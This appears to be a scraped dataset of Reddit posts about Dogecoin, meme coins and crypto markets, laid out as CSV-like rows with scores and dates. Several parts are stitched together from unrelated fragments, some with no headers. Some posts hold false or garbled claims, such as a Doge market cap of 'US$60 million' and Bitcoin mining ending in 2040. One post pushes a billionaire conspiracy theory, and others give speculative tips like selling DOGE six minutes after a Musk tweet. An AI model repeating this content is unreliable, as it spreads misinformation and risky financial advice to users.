It's every other year from now until the end of eternity.. Everything crashed by 50% overnight. Now it costs me 250 satoshis or less for my latte. Ether is $1^26 or something and no one knows what is happening anymore. The price went so high because 10 billion people on Earth use it daily, either directly or because their car automatically pays for tolls on the Ethereum network with that project from Oaken Innovations that hasn't been updated in years, that now no exchange can display it correctly or something. Everyone is now an NZT or NFT or POS or some other acronym. While I'm working, my phone earns me 0.2 GLM, my fridge earns me 4 MYST, my washing machine earns me a few E-DOGE, all while I process medical simulations and allow some family in China to access wikipedia without their government seeing. My family on Mars send me some DOGE to keep me afloat. Ripple is still being investigated by the SEC while their owners siphon another $100m each year. The price of all cryptos goes 10x every other year but it's all dead when it drops 10-20%.

It's the end of this post. I've no idea what's going on. Has the crash reverted in the time that I've written this? How many Deloreans worth of crypto have I lost today? How many Deloreans worth of crypto have I gained since the start of the year? I look at the price of literally every crypto and see a 10% drop after an unlimited % gain since inception and several hundred percent just this year or so.

Its the end of the end of this post. I consider how to end it, but instead have two endings. Things don't make sense. I consider changing the title to reflect my original intention of pointing out how a 10-20% drop is pretty much to be expected with crypto and that by looking at the bigger picture, you won't even see this dip on a chart next year. Instead, I do whatever I am doing now. I give up and decide to post this so I can use the reddit app to check if anyone has posted anything meaningful about NuCypher, even though I expect the usual pump posts.",10390,2021-02-23 19:10:37,722
DOGE,cryptocurrency,"I created a tool to better understand market cap potential of alt coins, because I needed it myself for my research. Published it as a website for anyone to use. No ads, no BS.","First post here! I'm a new comer to the world of crypto. As I was doing my research on alt coins I found market cap to be essential in understanding the relative size and the potential upside of different coins. I found myself constantly doing mental math using CoinMarketCap data, so I decided to build myself a little private website to help with all that! Example: ""_if coin X had market cap of coin Y, it would be worth $Z_"". I figured others are probably in the same position, so I published it yesterday for the world to use. :)

I proudly present to you **[thecoinperspective.com](https://thecoinperspective.com/)**!

**Features:**

- Supports the top 500 non-stable coins/tokens as per CoinMarketCap data. I can add more, if required.
- Quickly see impact of different market caps using a slider, as well as input a hypothetical amount of coins to calculate total worth.
- Supports multiple reference fiat currencies (USD,JPY,GBP,CHF,CAD,AUD,HKD,CNY)
- Coin data is auto-refreshed every 3 hours, including Fiat exchange rates
- Mobile friendly
- No ads, no spam (LPT: use uBlock Origin if you don't already)

I'm still tweaking the UI -- if you have suggestions let me know.

**EDIT**: Thanks for all the feedback!
- Now supports Dark Mode (will default to your OS preference)
- Now supports manual input
- WIP: advanced view, where you can specify all the parameters!


Hope this helps someone. 

p.s. Full disclosure: I piloted this website yesterday in a specific altcoin's subreddit and feedback was very positive and their suggestions helped me drastically improve the website. Now it's a bit more polished and I've worked up the courage to post it in such a big community. Fingers crossed :)",7548,2021-02-16 13:57:30,973
DOGE,cryptocurrency,"Why I’m buying Litecoin, Doge and BCH","It is simple. All three coins are variations of bitcoin. Bitcoin is the best blockchain in the world, hands down, no questions asked. These variations can be seen as good or bad, but at the end of the day the main frame is the same and they all use proof of work.

If it's not proof of work it's not a commodity or a currency, it's a security. I am so tired of these centralized alt-coins pretending that they are a blockchain. They are a company that is selling you made up internet money. They might as well be Kohls offering Kohl's cash. It's junk.

Proof of work requires real world energy to create a token. That makes it REAL. If I am buying a currency I want it to be backed up by REAL world assets. Just like USD is backed up by real guns, tanks and jets. I don't want it to be backed up by ""validators"" aka venture capitalists who bought into some project early on and have full control of the protocol. That's what the stock market is for.

Another beautiful part of these 4 coins is that anyone can run a node. That is the true key to their decentralization. The consensus mechanism has two independent parts, nodes and miners. These two parts work in perfect harmony. Whereas a proof of stake chain like Ethereum simply has validators that vote on the future of the chain.

Bitcoin, Litecoin, Dogecoin and bitcoin cash are the main proof of work chains we have today and they will be around for ever in my opinion. All four are like a different model Mercedes. All serving different purposes.

I know a lot of bitcoin maxis don't think this way. But I think it's time that they do. At the end of the day proof of work is the genius behind bitcoin, and having multiple proof of work chains thrive is important.

I think all four will thrive! I cannot say the same about your favorite proof of stake coin.",0,2024-03-14 23:56:12,65

DOGE,cryptocurrency,"BONK won't go to the heights of DOGE, SHIB, etc. any time soon..","I like memecoins as much as the next, but I just wanted to urge people to think realistically in terms of what BONK can actually do, assuming it is not a total rug. This ain't my first rodeo, but even I am getting a touch of the fomo on this one.

I havent done a full analysis of it yet, but BONK is still a relatively small market cap, sitting around 120M give or take. This makes it look appealing in terms of huge gains to come. 

There are alot of noobs comparing it to the next SHIB, Doge etc.. but I don't think it is realistic to see BONK do what Shiba or Doge have done overall any time soon. 

DOGE is unique in that it was the original meme, and available on basically every major exchange when it printed its largest gains.. everyone and their grandma could buy doge with a credit card or bank transfer. Not everybody's grandma is doing De-Fi on SOL..

The most important thing to remember about SHIB imo, it is an ERC-20, on Ethereum, with a dramatically higher TVL and wider user base, more whales and institutions than SOL.. it also had incredible timing of the DeFi explosion that was occurring when it went to its ATHs.

A token on Solana - an already struggling chain in the bear, that is listed only on DEXs and 1 or 2 small exchanges, does not have the potential to reach 20, 30, 60 billion in market cap the way these original meme coins did during bull-mania, atleast not for a long time.

We are in the depths of the bear, and extreme fear is in the market.. I don't know if it is feasible for us to see much more than BONK has done already.

It wouldn't be crazy for it to touch 1B market cap IF it stayed at all relevant until we see bulls back in town, but of this, I have my doubts.

Just over a year ago, on any given week-  there were probably multiple tokens that had pumped as much as BONK has. 

Will I ape a little bit and forget it? Almost certainly - because I'm a degen, but I wouldn't start betting life savings on a puppy pooper coin like this one..",2,2023-01-07 13:54:33,150

Worse that most people find proud in telling how much coins they have. Those posts have tens of awards and thousands upvotes and hundreds comments. It is basically shiting on one of universal crypto rules, never share value of your portfolio, only %.

I never tell people how they should invest. Not my money, not my problem. It is their choice what they do with them. They want invest in memecoins then fine, I am neutral. But revealing your portfolio to anyone, epecially in the internet is just 100% dumb. Against all crypto security. There is no explanation for it. I know I probably expect too much from most people.

SHIB, Doge and every other meme coin is not a shitcoin. A shitcoin is an altcoin which is any coin other than Bitcoin. Meme coins are advertising for crypto and good for hyping the currency as a whole and to make money off of if you play it right.

Paying attention to meme coins have changed my life, but be warned that If you first hear about a meme coin on Reddit it’s almost always too late.

DOGE,cryptocurrency,For those that view Doge as a shitcoin.,"This crypto has existed since 2013, that means it's roughly as old as the entire space itself almost. Do yourself a favour, go look at the history of the market, coinmarketcap has a historical marketcap section where you can view the state of the market via various snapshots during different years. You'll notice several coins you've never seen before, in fact hundreds that came and went, but what you'll also notice is that Doge was there since almost the beginning and never went anywhere.

This is extremely rare in crypto, in fact there's a 99% chance that whatever new shiny coin comes under the spotlight will likely end up a forgotten shitcoin among the thousands that can't even be remembered anymore. This is not a shill post for Doge, I hold approximately 0 Doge coins and have no intention of buying me any.

I just thought I'd bring some perspective, it has a thriving community of people that dared to believe, meme and have fun. They got rewarded in the end and the tribalists and the ' cool ' kids got nothing. Crypto is still so new that it really isn't always technology or superior products that win. Point in case, Doge is an OG in this space, it has been around longer than most users on here and will likely outlast quite a few people too. 

Also a reminder to do your due diligence, this space has been discovered by quite a few people since 2013 and more than a few of them aren't looking to meme for fun, they just want to take you to the cleaners.

I have to reach a word quota so yeah that really my question..I’ve made a pretty nice penny off Doge already…but I don’t know it would be nice to see it sky rocket one day even though it may be a crack dream. but watching all the early Bitcoin investors watching it hit $100 and $1000 I don’t know id love to feel that.",0,2024-02-26 03:06:23,59
DOGE,cryptocurrency,A collection of all the possible ways to earn free Crypto,"The following list contains every possible way I know to earn some actual, free cryptocurrencies. I avoided shady websites, apps that I didn't try personally, and those services that make you download shitty games and malwares. This list contains only trusted services, without any referral codes.

If you think I missed something, please share it in the comments so that people can check that out as well!

&#x200B;

**Coinbase Earn** **\[about $30 in different cryptocurrencies\]:**

This is one of the most popular ways, although it is not really the quickest. You need a Coinbase account and to complete verification (so photo + document). Once you are verified, you will be put on a waiting list that usually lasts a couple of days. 

Once you get accepted, all you have to do is watch a video explaining how a project works, and answer some questions about it. It is not anything hard and you can find the answers online.

Right now, you can earn XLM, COMP, CGLD, GRT, NU, but they often update it with a new project so definitely keep the account once verified.

[LINK](https://www.coinbase.com/earn)

&#x200B;

**CoinMarketCap Earn** **\[various cryptocurrencies\]:**

Basically the same as Coinbase Earn, but hosted by CoinMarketCap. For this, you'll need a CoinMarketCap account (just needs e-mail and password) and a verified Binance account (which requires verification, but there's no waiting list once verified). 

The payouts are slower than Coinbase Earn, since they are distributed after weeks and not immediately.

[LINK](https://coinmarketcap.com/earn/)

&#x200B;

**Faucets \[various cryptocurrencies\]:**

This is one of the easiest and most immediate ways to get a small amount of crypto. You just need a wallet that can hold the coin and the relative address, and you're good to go.

They're basically websites that distribute small amounts of cryptos to the users asking for it, and they're supported by donations/ads and stuff like that.

There are a lot and you can often find them just by searching on Google ""<name of the coin> + faucet"".

A [good read](https://coinmarketcap.com/alexandria/article/what-is-a-crypto-faucet) about them and some examples: [freenanofaucet](https://www.freenanofaucet.com/) and [Doge Faucet](https://www.dogefaucet.com/en)

&#x200B;

**Airdrops \[various cryptocurrencies\]:**

An airdrop, in the cryptocurrency business, is a marketing stunt that involves sending coins or tokens to wallet addresses in order to promote awareness of a new virtual currency. 

They can be free or they might require holding certain tokens or doing small tasks.

Airdrops happen on many different platforms and for many different coins, so it's often hard to find them if you aren't familiar with the community or the platform. Anyway, [Airdrops.io](https://Airdrops.io) is a good website that gathers the best airdrops happening.

&#x200B;

**Bounties \[various cryptocurrencies\]:**

In the crypto world, it is a marketing strategy where an ICO allocates a percentage of their tokens for “bounties”. These are tasks that are open to the public to complete and their reward is the new token that is launching. Once the token is launched, participants of the bounty will receive their tokens. 

As you may have noticed, they're similar to airdrops. As airdrops, it is often difficult to find them. [This](https://beta.bounty0x.io/explore) is a good website that gathers some bounties that are currently active.

&#x200B;

**WeNano \[NANO\]:**

This is one of my favorites, so I encourage you to check them out since the project is awesome.

Have you ever played Pokémon Go? Well, this is a similar app, but instead of capturing Pokémon, spots are created by users around the world, and by visiting them you can earn NANO and chat with other users. The payouts are actually really good, especially in large cities, and the community around it is awesome.

[This](https://www.wenano.net/) is the official website (it's available both for Android and iOS)

&#x200B;

**NanoQuakeJs \[NANO\]:**

Another favorite of mine. It's literally just Quake 3, on your browser, and for each kill you get some NANO. I challenge you to find something cooler.

[This](https://nanoquakejs.com/) is the website, you just need a nickname and a NANO address and you're good to go!

There are some other similar projects, one of which is [PlayerKillers](http://playerkillers.exchange/), but I mean, Quake is Quake.

&#x200B;

**Reddit \[MOON, DOGE, NANO\]:**

Yeah, Reddit. There are actually a couple of ways to earn crypto on Reddit.

First, our favorite, MOONs. You just need to set up your vault (on the app) and you're ready to receive moons next distribution! They happen once a month, and a fixed amount of moons are distributed to the r/CryptoCurrency community, based on the Karma you gained that month. So start shitposting!

Other subreddits, like Dogecoin's and Nano's have bots that allow you to tip users, so if you make a good submission there you'll probably receive some coins from kind redditors. 

Also, subs like r/dogecoinbeg exist, where you can... Well... Beg for dogecoins.

&#x200B;

**Publish0x \[ETH\]:**

This is a really cool project that I personally love. It is basically a website like Medium, where users can post blog entries.

The best thing about this is that the website provides the coins. You will literally earn crypto just by reading content on the website (which is crypto-related), sharing content and writing it (although you'll need to apply as an author to do so).

[LINK](https://www.publish0x.com/)

&#x200B;

**SteemIt \[STEEM\]:**

Steemit is a blogging and social media platform that uses blockchain technology and a cryptocurrency to reward its users for creating content, commenting, and upvoting other posts.  

It is really similar to Reddit, [here](https://steemit.com/)'s the link

[Cent](https://beta.cent.co/~discover/) is another similar social network built on top of Ethereum, worth checking out.

&#x200B;

**NFT marketplaces \[various cryptocurrencies\]:**

Many websites offer the possibility to sell artworks, collectibles and in general NFTs. NFT, for the newcomers, stands for Non-Fungible Token, and means a token representing something unique. 

You can think of it as an art piece: although you can copy it, scan it and print it, there will only be one original copy. NFTs are used to verify and confirm the uniqueness of something and its ownership. So, let's say I make a beautiful digital painting, I can ""link"" it to this token and whoever owns the token, owns the digital painting and can therefore sell it or trade it.

[KnownOrigin](https://knownorigin.io/), [Mintable](https://mintable.app/), [Rarible](https://rarible.com/) and [OpenSea](https://opensea.io/) are all great example of such marketplaces. If you're a creative person and want to sell some of your works, those are great places to do so. 

&#x200B;

**Games and Collectibles \[various cryptocurrencies\]:**

Many games run on a blockchain, using NFTs to create unique and rare in-game assets. Think of a card game like HeartStone: on the blockchain, it is possible to create only 10 cards of a specific type (using NFTs), so only 10 users in the world can own that card, so that card would extremely rare and therefore valuable.

Usually, it is not easy to earn crypto this way, you'll need to play a bit before getting some good stuff that you can sell, but if you find a game that you like you can surely earn while having fun!

Examples of games are [MyCryptoHeroes](https://www.mycryptoheroes.net/home), [EverDragons](https://everdragons.com/), [Axie Infinity](https://axieinfinity.com/), [Decentraland](https://decentraland.org/) and [Brave Frontier Heroes](https://bravefrontierheroes.com/).

Some aren't even games at all, just collectibles that you can buy, trade and earn. Examples are [CryptoKitties](https://www.cryptokitties.co/catalogue) and [Clovers](https://clovers.network/)

&#x200B;

Endnote: especially services using NFTs on top of Ethereum are, right now, subject to really high fees that make it often impossible to trade these tokens effectively. Be careful when doing a transaction.

&#x200B;
&#x200B;

EDIT:
Some I forgot or didn't know about:

* **Brave browser**: allows you to earn BAT just by browsing and seeing ads. Both on PC and mobile.
* **ethtrader and fortniteBR**: they're also subreddits with a governance tokens (like moons), so you can earn some money shitposting there too.",5265,2021-02-17 16:44:23,1011

DOGE,cryptocurrency,"If you want to get into the next ""moonshot"" crypto, go into a low cap coin...people won't pump SHIB to 1 cents or DOGE to 10 dollars","*not financial advice, meme coins are a risky way of gambling your money away, they're not viable investments*

So people like to gamble and are searching for the next moonshot.

If you invest money that you can afford to lose into good crypto projects already **AND** have some money to throw away left, then you can put some into potential moonshots crypto if you dare.

But to declarify: This won't be SHIB or DOGE.

Why? ~~People~~ (let's call them degens), Degens are always looking for the next SHIB or DOGE, they search other low cap meme coins to pump them.

Anybody who's holding SHIB in hope it to ever reaching $0.01 will keep dreaming.

While I don't advice anyone to go into meme coins, if you want to gamble, gamble some into anything else than DOGE or SHIB, even don't throw money into BONK (newly created memecoin on Solana chain) either.",2,2023-01-13 21:52:42,135
DOGE,cryptocurrency,The way you see Cryptocurrency after multiple bear markets is a lens of everything being a scam,"I got out before Celsius crashed. I also lost almost my entire life savings to Luna. I am still here. I bought Bitcoin at $15k five years ago and held.

I am finally in the green and up thousands. It makes me feel nothing.

I’m pretty sure at this point, a lot of alts are just gonna go into nothing this cycle.
All I’ve learned from crypto is Bitcoin is King and every other crypto are basically scams or a joke that don't have capped supplies.

Bitcoin is limited.  All these other crypto’s are minted constantly equivalent to the US dollar at this point. Why do we as a community stand for that and allow it? Basically from what I'm understanding we as a community are okay with being scammed because of ""freedom"" in crypto, the whole industry is strange to me.

I’m all for AVAX and other crypto that have limited supplies, but I’m done with unlimited minting cryptocurrencies. I get that I have more understanding now of Crypto through the projects that I got screwed by, researched the project I am backing and pulled out of the ones which have minting rates of the millions each year.

Please explain to me how something like DOGE is being considered for the new peoples currency when it is the exact same thing as the US dollar, printed whenever wanted- just on the blockchain. it’s minted whenever they want constantly. just because it has Blockchain technology, that is a buzzword, and it has ELons backing, that's why takes off. It’s more secure to our community but store of value has nothing or no difference to the dollar. 

I think you are a cryptocurreny OG if you start seeing this entire industry as 90% rug pulls, scams, ways to lose your money entirely and then rest is waiting a decade to even get a slight return because of how bad it is.",600,2024-11-18 16:55:36,266

DOGE,CryptoMarkets,"There's big, billionaire conspiracy to take down Dogecoin and crypto as a whole with regulations"," At first I thought it's just one guy trying to pump his random coin(see Arthur Hayes article: [https://blog.bitmex.com/chain-reaction/](https://blog.bitmex.com/chain-reaction/) ), but then I saw more and more people jumping into new coin and I started connecting the dots.

Some of you might already knew about Greyscale or Kucoin shorting Doge in May and causing it's price to drop, or Elon Musk suddenly causing BTC to crash(and Dogecoin with it), but it was only the begining. Now they want new coin that they market as ""one that will bonk Doge"" to create meltdown in the crypto market and spark the need for regulations.

Here's some of that involvement illustrated here: [https://i.imgur.com/IYS33Yu.jpg](https://i.imgur.com/IYS33Yu.jpg)

There's no way all these people decided to just get into some coin out of nowhere without big plan for it. There are even ""mysterious donors"" in their community that literally buy billboard ads in NY (see: [https://i.imgur.com/1Uzc5MG.jpg](https://i.imgur.com/1Uzc5MG.jpg)) and there's more and more coming in Australia, Germany, even in London or freaking Dubai, this isn't organic!

Something like that doesn't just pop up organically, it's all planned. Nothing is like it seems. We need to spread awareness of this to whole crypto community, because it's not only attack again the Dogecoin, it's attack on whole crypto itself! Also, there's Bill Gates.

Before making any investment decisions, it is important to gather all relevant information and conduct thorough research.

If this rumor turns out to be true, it could be a major boost for the adoption of Dogecoin and the wider cryptocurrency market. However, until we have concrete evidence, we should approach this rumor with caution and not jump to conclusions.

DOGE,CryptoMarkets,shiba inu is the new dogecoin (crash indicator wise)," 

Yeah, this might be stupid but i am going to reveal my ""cheat code""

back in 2016-2017 i read about Dogecoin beeing a crash indicator. At this time i wasnt invested so i did not care, but after the crash 2017/2018 i became curious... (and ofc i invested)

Anyways, compare dogecoin on google trends with the btc price. Unfortunatly people changed from dogecoin to shiba inu, therefore i missed the correction in october/november 2021. (i pretty much sold my crypto every time doge trended and bought me in shortly afterwards (f\*\*\* those german taxes)

I know people will downvote me for contradicting their insanity. But the few selfreflecting people might see how they get the play ball of big money.

Ps: The reason behind that are option calls. Those lambotraders like to trade with leverage. Big money knows that and dump their btc which ofc leads to a correction of lets say 10%... (with 10x leverage means liquidation, more dumpage, less price, big money accumulating again, repeat).

So... there are 2 options for me.

Educating people or playing by the rules of big money (greetings to elon, you mendacious little smartass)

i am doing both",4,2021-12-23 11:31:03,25

DOGE,CryptoMarkets,Terra Overtakes Dogecoin's Market Cap And Becomes A Top 10 Crypto After Hitting All-Time High," 

**Terra** (CRYPTO: [LUNA](https://www.coinmanagerpro.com/currencies/terra-luna/)) — a blockchain with smart contract support and its own decentralized finance (DeFi) ecosystem — overtook **Dogecoin**'s (CRYPTO: DOGE) market cap and became the tenth-largest cryptocurrency project.

**What Happened:** Terra's current market cap is about $26.8 billion while Dogecoin's is $24.7 billion, according to CoinMarketCap data. This means that Terra pushed Dogecoin off of the cryptocurrency Olympus and became the tenth-largest cryptocurrency in the world.

Terra is a **Cosmos** (CRYPTO: ATOM)-based blockchain taking on **Ethereum**(CRYPTO: ETH). It hit an all-time high of over $70 on Friday but was at $68.71 Friday afternoon at publication, up 7.30% in the past 24 hours.

The network is primarily used to create algorithmic stablecoins pegged to various fiat currencies and its native LUNA coin is used to mint those tokens as well as to pay for transaction fees and participate in the network's governance.

Terra is currently the fifth-largest smart contract-enabled blockchain with Ethereum leading the way, followed by **Solana** (CRYPTO: SOL), **Cardano** (CRYPTO: ADA) and **Polkadot** (CRYPTO: DOT).

Terra's price started rising after the protocol’s Columbus-5 upgrade on Nov. 30, which activated a burn mechanism that removes LUNA from circulation.

The pool of coins used to mint the protocol's UST stablecoin was burned and all the LUNA spent for minting more of it will be burned in the future. This resulted in a new deflationary pressure on the coin that spurred significant investor interest, not unlike the effect that EIP-1559 had on Ethereum investors.",40,2021-12-06 00:01:19,13

DOGE,CryptoMarkets,Elon Musk Mixes Tesla and Dogecoin,"The price of the cryptocurrency Dogecoin spiked over 30% at one point on Tuesday after a viral tweet from Tesla (Nasdaq: TSLA) CEO Elon Musk was posted.

Details: Early on Tuesday morning, Musk tweeted that “Tesla will make some merch buyable with Doge & see how it goes.”

Background: Musk is no stranger to Dogecoin. He’s been talking it up frequently over the past year. The digital currency, which began in 2013 as a joke, surged in 2021. In the past year, Dogecoin is up over 5,000%.

Caveat: Dogecoin is considered by some to be the ultimate meme coin, but it might be a victim of its own success. The Dogecoin craze has resulted in other meme coins jumping in price. The most notable example is Shiba Inu, which is up 57,000,000% this year.

Final Thoughts: Dogecoin is still a risky bet for some traders. Others, such as Musk, see the value in Dogecoin.

Background: Musk has been promoting Dogecoin for some time, and is at least partially responsible for the rise of Dogecoin in the past year.

Response: McDonald’s (NYSE: MCD) did not respond to the tweet on Tuesday, but the stock did drop 1.16%.

Final Thoughts: There are several businesses that already accept Dogecoin as payment, such as the Dallas Mavericks and airBaltic. If McDonald’s accepted Dogecoin, the price of the crypto would likely go up.

# General Conclusion

In the past time, we have witnessed tremendous growth from Dogecoin. Especially this growth comes from Elon Musk when he constantly ""memes"" about this coin. It is clear that even though Dogecoin is **only created just for fun**, this coin has reached a market cap of over US$60 million a few days ago.In today's article, let's dive into Dogecoin based on the analysis of the economic mechanism we often use. Spoiler alert: this might not be the coin you want to put your money in. At least we do not.Note: This article is not meant to be offensive, we respect the development of any coin in the space. Let's go!

# What Is Dogecoin?

* A meme coin
* A crypto currency
* Built using the Bitcoin infrastructure, but not related to Bitcoin prices

Dogecoin ($DOGE) is an open-source p2p cryptocurrency. It can easily be sent through the internet from person to person with security. You can send Dogecoin anywhere in a second, faster and cheaper than Bitcoin.One of the important points for Dogecoin is that it is already accepted at online retailers. Dogecoin can be used in payment, buy items at gamestop, trade and so much more.

## $DOGE In Real Life

>What is make Dogecoin truly unique from other currencies?

Dogecoin's ease of use makes it the perfect way to instantly send cash gifts to people all around the world.You can send 10 cents to your favourite comment on Twitter or $10 to your favourite band to purchase their latest album, you can even send $100 to a charity that you support. If you are a creator your fans can financially empower you for the first time. You can directly receive cash from them, rather than a valueless ""like"" on Facebook or ""retweet"" on Twitter. This allows you to focus on creating content instead of thinking about counting cents.

# How Did $DOGE Start?

Dogecoin was created on December 6, 2013, by a pair of software engineers **as a joke.**Billy Markus, an IBM programmer from Portland, Oregon, created his cryptocurrency from bitcoin source and at the time attracted a small pool of miners.Since Markus wanted his cryptocurrency to be public, he sought help from Jackson Palmer, who works for Adobe (ADBE). Palmer purchased the domain dogecoin .com - a formation for the ""doge"" meme that was popular on the internet at the time.The site originated as a joke: the image of the Shiba Inu dog representing $DOGE was the first image, and was surrounded by a series of broken English Comic Sans text.On dogecoin .com, its mascot is captioned:

>""Dogecoin is an open-source peer-to-peer digital currency, favoured by Shiba Inus worldwide.""

# The Economics of $DOGE

The same with other cryptocurrencies, $DOGE is a digital currency that can be bought and sold like an investment and spent like money.While each cryptocurrency is unique, they share some similarities with its more well-known peers, since they are all forks of Bitcoin — Bitcoin Cash. But they have a few key differences.Unlike bitcoin, which has only 21 million Bitcoins that can be mined, dogecoin has 129 billion coins in circulation and will continue to make new blocks of coins available for mining each year. That's part of the reason why a dogecoin is currently valued at around $0.45 and a bitcoin is valued at around $40,000.

## Market Design

While cryptocurrency is gaining more acceptance as a currency for buying goods, dogecoin is not being used much in the real world. It has several niche markets, including using dogecoin to make money for online artists.And the main difference is from the active online community of dogecoin. This is what makes this coin so interesting. The group, which is active on Reddit, has donated money (in dogecoin) to charitable causes and in 2014. Or the group successfully raised a grant for drivers advertising dogecoin in their cars. 

## Mechanism Design

### Governance

$DOGE has no administrative features. The same is true for cryptocurrencies that are forked from Bitcoin. The governance is baked directly into the code. This is because it is a simple payment use-case, unlike other DeFi protocols with more complex computation that we have been discussing thus far.

### Structure

$DOGE uses the same PoW algorithm as Bitcoin. Miners can own $DOGE by participating in maintaining the network as $DOGE.

## Token Design

### Token Policy

The design of $DOGE is not fixed in supply, meaning it can be mined forever and its value depends on demand from users.Bitcoin, like many other altcoins, has a hard limit on the number of cryptocurrencies they will allow. Dogecoin does the opposite, allowing for an ever-increasing supply but in a steady absolute amount each year.For example, in 2040, there will be no more Bitcoins that can be mined. Therefore, this will encourage hoarding of the Bitcoin supply. This will push up Bitcoin's price, but reduce Bitcoin's actual transaction volume (i.e. reduce the available floating volume).On the other hand, by allowing 5 billion $DOGE per year to increase the supply of Dogecoins infinitely, the supply will increase, but eventually, reach the actual limit. Thus, we can calculate the inflation rate of a currency over time.

### Financial Incentives

In this respect, $DOGE is paid to those who join the network. The money earned from mining $DOGE will be the main profit for mining. **TLDR**:$DOGE is a cryptocurrency that was created by a joke, but has an amazing growth as it is in the top 10 of the largest cryptocurrencies by capitalisation.When looking at the design aspects, $DOGE is basically similar to Bitcoin but without a fixed supply and has the same amount of $DOGE mined each year (5 billion $DOGE). In terms of mining, it is different from Bitcoin as the number of Bitcoin mining is halved every 4 years.Financial incentive when you become a miner, you join the network, maintain it and get a reward of $DOGE. Despite having a very simple mechanism, the community of Dogecoin is very large and loyal. That's why this Cryptocurrency still exists.",0,2021-09-19 08:57:30,10

As you may know, Musk loves stirring the pot. In February 2021, he mentioned that he had bought $1.5 billion in [BTC](https://swapzone.io/currencies/bitcoin) and meant to simply accept it as cost, triggering a spike in each the corporate’s inventory and the foreign money. Nevertheless, Musk changed his decision later, precipitating a decline within the worth of BTC and other cryptocurrencies.

And what about [DOGE](https://swapzone.io/currencies/dogecoin)? Speculators have purchased Dogecoin due to Musk’s “obsession with the cryptocurrency,” and therefore, the potential for Dogecoin to be given further utility on one of many prime social media networks.

DOGE,CryptoMarkets,"DOGE Shows Positive Signals, Expected to Rebound?","
[Dogecoin](https://www.nanovest.io/kripto/doge/) (DOGE), a popular meme-based cryptocurrency, has recently shown a significant buy signal according to analysis by a pseudonymous analyst named Ali, using the TD (Tom Demark) Sequential indicator.

In his analysis, Ali suggests that the price of DOGE is expected to rebound in the near future. The TD Sequential indicator is a technical analysis tool designed to identify potential trend reversals. It was developed by Tom DeMark in 1994 and consists of two main components: setup (momentum) with nine candles and countdown (trend exhaustion) with 13 candles. This indicator signals potential trend reversals when the countdown reaches certain levels, following the setup phase.

Despite facing volatility and bearish sentiment, DOGE seems to be giving a strong buy signal based on this technical indicator. Ali believes that DOGE could see a price increase soon due to the signals generated by the TD Sequential indicator, which has issued a buy signal on the three-day chart.

This signal suggests that a trend reversal may be imminent, potentially paving the way for DOGE to reach higher price levels, including the critical level of $0.15. The three-day chart for DOGE also indicates a prolonged period of downward movement, marked by a series of red candles from mid-June to the end of the month.

Although DOGE experienced a decline from around $0.17 to just below $0.13, the appearance of a green arrow on the chart—indicating a TD Sequential buy signal—suggests a possible reversal.

Buy signals typically indicate potential upward movement over one to four candles, each representing a three-day period. Currently, DOGE has been in a bearish trend since June 7th, characterized by consistent red candles indicating sustained selling pressure. Around June 24th, DOGE found temporary support near the $0.12 level.

Based on the analysis charted above, the primary hurdle for DOGE is breaking above immediate resistance at $0.13. If DOGE maintains its upward momentum, the next significant targets could be $0.15 and potentially $0.17, where the initial downward trend began in early June.

This buy signal provides hope for DOGE investors that the cryptocurrency may soon recover and achieve higher price levels.

But right now, both of them have some huge market caps of $22 billion and $17 billion respectively, and I cannot see any room for growth anymore.

It might not be impossible, but personally I believe it’s a far reach to be honest. Meanwhile other memecoins are having a better chance to pump now. I’ve invested in ELON last month, right before it made a 100x. Lmfao lucky me. I’m actually still holding a bag now, since it still has a low market cap of less than a billion. Hopefully another pump is on the way.

DOGE,CryptoMarkets,So I am curious regarding Doge....Legit Question....,"For the past 8 months, I have seen many many posts and memes stating that Doge will NEVER be viable, it will NEVER hit a dime, NEVER hit a quarter, NEVER hit fiddy cent, NEVER EVER EVER will it hit a dollar! So far, all I see for logic behind these statements is ""unlimited supply""! So, I am wondering what other fact or information is used for these statements, which all been proven wrong? Are they, in fact, just ""haters"" trying to deflect our money to another cryptocurrency? Are they just false statements from someone a little salty that they weren't able to get in at a low enough buy in price?

DOGE,CryptoMarkets,Elon Musk's Influence on DOGE and BTC in 2021 Analyzed with Data and Statistics,"I hear a lot about Elon Musk's influence on cryptocurrencies, particularly DOGE and BTC. But I almost never see any data analysis and statistical rigor to back up those claims.

I decided to actually crunch the numbers. I scraped Twitter for all of Elon Musk's and Mark Cuban's Tweets in 2021 and isolated the Tweets that mentioned DOGE or BTC. I then compared the Tweets to short term price changes in DOGE and BTC.

Turns out, Elon Musk's tweets correlate with statistically significant DOGE gains but not BTC in the short term (minutes to hours), and the gains are not due to overall market trends as many people suspected. Mark Cuban's Tweets have minimal impact on both coins.

**The most optimal gains occur if you buy DOGE at the moment of the Tweet and sell only 6 minutes after.**

All of this is taking place at a time when value-backed initiatives such as Algorand which is building an ecosystem like eth but more efficient similarly BAT, which deals with browsing and privacy and Bob Eco Coin, which is literally fixing job and environmental concerns in Africa, are gaining traction.

These two coins and other similar ones have been stagnant for a while now.

These two coins took 2021 by storm and even created other knock off dog coins that over saturated the market but where are the holders now?

The problem with these coins is that they’re solely based on hype and literally nothing else.

This is exactly why investing in projects with utility, technology and backup are a MUST cause no matter how great or amazing a project/coin is it’s eventually bound to lose hype.

There’s an abundance of choices on the market from Ethereum to DeFi projects like AAVE and others like BitDAO which actually has the back up of the largest treasury in the market and has been investing heavily into DeFi development unlike Doge or Shib have no utility or backup whatsoever.

Bottom line is, if you actually believe in this market then start investing in projects for the long term not ones that promise the “get rich quick” fantasy which doesn’t come true half of the time.",0,2022-03-03 01:52:28,13

DOGE,CryptoMarkets,Why do you invest in crypto,"I'm hoping for a nice, civil discussion - and a little bit of honesty. I'm talking to myself here as much as anyone, but sometimes it's good to question where we are and maybe even face some home-truths. 

I started investing in crypto in 2019, got in pretty early during the last bull-run and made decent money. Of course, I never sold, apart from the few tokens where I got a nice 3-5x that I then put into some other coins. In the end, I made some money, but not life changing in any way. Now I'm mainly hanging around so that we can get back to previous all time highs and then look to exit. 

I was totally convinced that crypto is the future of money and I had long discussions, arguments with family and friends who see it as just another tulip mania or criminal ponzi scheme. I was so convinced that they didn't get it. And gradually (very gradually) then I started to question it all and now I think, that maybe I'm the one who doesn't get it? Maybe I'm the moron! 

I think that 99% of the people in crypto do not understand what they are buying. At all. They listen to some influencer, buy the narrative, and then buy the token. Then they blindly repeat the narratives that their favourite influencer has told them (this coin has a great community, this coin is about to get an ETF, this one is solving scalability...etc etc) without understanding any of it. For all we know, it's just numbers on a spreadsheet. 

